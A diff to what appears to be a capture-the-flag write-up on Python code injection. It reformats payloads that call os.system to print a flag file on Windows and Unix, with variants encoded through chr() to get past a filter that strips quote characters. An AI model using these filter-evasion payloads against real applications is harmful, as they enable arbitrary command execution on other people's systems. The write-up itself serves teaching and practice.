@@ -7,8 +7,14 @@ Since `"` and `'` are replaced from the input with an empty string, you need to 
 
 The following executes a system command to print the contents of the file.
 ##### Windows: 
-`__import__("os").system("type flag")`<br>
-encoded: `__import__(chr(0x6F)+chr(0x73)).system(chr(0x74)+chr(0x79)+chr(0x70)+chr(0x65)+chr(0x20)+chr(0x66)+chr(0x6C)+chr(0x61)+chr(0x67))`
+```py
+__import__("os").system("type flag")
+# encoded:
+__import__(str().join(map(chr, [0x6F, 0x73]))).system(str().join(map(chr, [0x74, 0x79, 0x70, 0x65, 0x20, 0x66, 0x6C, 0x61, 0x67])))
+```
 ##### Unix:
-`__import__("os").system("cat flag")`<br>
-encoded: `__import__(chr(0x6F)+chr(0x73)).system(chr(0x63)+chr(0x61)+chr(0x74)+chr(0x20)+chr(0x66)+chr(0x6C)+chr(0x61)+chr(0x67))`
+```py
+__import__("os").system("cat flag")
+# encoded:
+__import__(str().join(map(chr, [0x6F, 0x73]))).system(str().join(map(chr, [0x63, 0x61, 0x74, 0x20, 0x66, 0x6C, 0x61, 0x67])))
+```
